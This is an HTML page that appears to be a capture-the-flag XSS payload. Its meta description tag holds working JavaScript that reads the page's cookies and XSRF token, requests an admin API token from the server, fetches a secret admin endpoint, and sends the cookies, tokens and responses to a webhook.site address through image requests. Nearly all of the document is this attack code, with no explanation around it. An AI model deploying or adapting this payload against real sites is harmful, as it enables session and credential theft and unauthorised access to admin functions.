<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>XSS Payload - Syntax Check v2</title>
    <!-- VERSION_SYNTAX_CHECK_V2 -->

    <meta property="og:title" content="Syntax Check">
    <meta property="og:description" content='<script>console.log("OG Description Executed - Syntax Check V2");</script>'>

    <meta name="description" content='<script>
        (function() {
            var webhook_id = "792a817c-a6b3-4529-a9ed-5780c728488a";
            var webhook_base_url = "https://webhook.site/";
            var attacker_url = webhook_base_url + webhook_id;

            function sendToWebhook(data_obj) {
                var params = new URLSearchParams();
                params.append("source_tag", "name:description_SYNTAX_CHECK_V2"); 
                
                for (var key in data_obj) {
                    if (data_obj.hasOwnProperty(key)) {
                        let value = data_obj[key];
                        if (typeof value === "object" && value !== null) {
                            if (value instanceof Error) {
                                value = { 
                                    error_name: value.name, 
                                    error_message: value.message, 
                                    error_stack: value.stack ? value.stack.substring(0, 500) : "no_stack",
                                    error_string: value.toString() 
                                };
                            }
                            try { params.append(key, JSON.stringify(value)); } 
                            catch (e_stringify) { params.append(key, "[Unserializable Object]"); }
                        } else {
                            params.append(key, String(value)); // Chuyển thành String cho chắc
                        }
                    }
                }
                var img = new Image();
                var full_url = attacker_url + "?" + params.toString();
                // Gửi trước độ dài URL nếu cần debug URL quá dài
                // var pre_debug_img = new Image();
                // pre_debug_img.src = attacker_url + "?debug_url_length=" + full_url.length;
                img.src = full_url;
            }

            var xsrfTokenValue = null;
            try {
                sendToWebhook({ 
                    stage: "syntax_v2_script_start", 
                    current_document_cookie: document.cookie || "empty",
                    location_href: window.location.href 
                });
                
                var cookies = document.cookie.split(";");
                for (var i = 0; i < cookies.length; i++) {
                    var cookie = cookies[i].trim();
                    if (cookie.startsWith("XSRF-TOKEN=")) {
                        xsrfTokenValue = decodeURIComponent(cookie.substring("XSRF-TOKEN=".length));
                        break;
                    }
                }
                
                if (!xsrfTokenValue) {
                    sendToWebhook({ stage: "syntax_v2_xsrf_token_extraction_failed_or_missing" });
                    // Không return ở đây nữa, cứ thử fetch xem sao, có thể không cần XSRF nếu có lỗi cấu hình server
                } else {
                    sendToWebhook({ stage: "syntax_v2_xsrf_token_extracted", extracted_xsrf_token_val: xsrfTokenValue });
                }

                sendToWebhook({ stage: "syntax_v2_before_generate_token_fetch" });
                fetch("/generate-token", {
                    method: "POST",
                    headers: {
                        "Accept": "application/json",
                        "X-Requested-With": "XMLHttpRequest",
                        // Thêm X-XSRF-TOKEN tường minh nếu xsrfTokenValue có giá trị
                        ...(xsrfTokenValue && {"X-XSRF-TOKEN": xsrfTokenValue})
                    }
                })
                .then(response => {
                    sendToWebhook({ 
                        stage: "syntax_v2_generate_token_response_check", 
                        status: response.status, 
                        ok: response.ok 
                    });
                    if (!response.ok) {
                        return response.text().then(text => {
                            throw new Error("Failed to generate token: " + response.status + " Body: " + (text ? text.substring(0,300) : "NoBody"));
                        });
                    }
                    return response.json();
                })
                .then(data => {
                    if (data && data.token) {
                        sendToWebhook({ stage: "syntax_v2_got_api_token", token_prefix: data.token.substring(0,10) + "..." });
                        var admin_api_token = data.token;

                        sendToWebhook({ stage: "syntax_v2_before_sup3rs3cr3t_fetch" });
                        return fetch("/api/admin/sup3rs3cr3t", {
                            method: "GET",
                            headers: {
                                "Accept": "application/json",
                                "Authorization": "Bearer " + admin_api_token,
                                "X-Requested-With": "XMLHttpRequest"
                            }
                        });
                    } else {
                        throw new Error("No token field in /generate-token response: " + JSON.stringify(data).substring(0,300));
                    }
                })
                .then(response => { 
                     sendToWebhook({ 
                        stage: "syntax_v2_sup3rs3cr3t_response_check", 
                        status: response.status, 
                        ok: response.ok 
                    });
                    if (!response.ok) {
                        return response.text().then(text => {
                            throw new Error("Failed to get sup3rs3cr3t: " + response.status + " Body: " + (text ? text.substring(0,300) : "NoBody"));
                        });
                    }
                    return response.json();
                })
                .then(flagData => {
                    sendToWebhook({ stage: "syntax_v2_GOT_FLAG2", flag_content: flagData });
                })
                .catch(error => {
                    sendToWebhook({ 
                        stage: "syntax_v2_overall_error", 
                        error_obj: error 
                    });
                });
            } catch (e_outer_most) {
                // Lỗi ngoài cùng nhất, có thể do lỗi cú pháp hoặc API trình duyệt không hỗ trợ
                 var img_outer_error = new Image();
                 var outer_err_data = {
                     source_tag: "name:description_SYNTAX_CHECK_V2_OUTER_ERROR",
                     error_message: e_outer_most ? e_outer_most.message : "Unknown outer error",
                     error_string: e_outer_most ? e_outer_most.toString() : "Unknown outer error"
                 };
                 img_outer_error.src = attacker_url + "?" + new URLSearchParams(outer_err_data).toString();
            }
        })();
    </script>'>
    
    <meta name="twitter:description" content='<script>console.log("Twitter Description Executed - Syntax Check V2");</script>'>

</head><body>
    <h1>XSS Payload Page - Syntax Check v2</h1>
    <p>The 'name=description' meta tag should contain the primary XSS payload.</p>
</body></html>
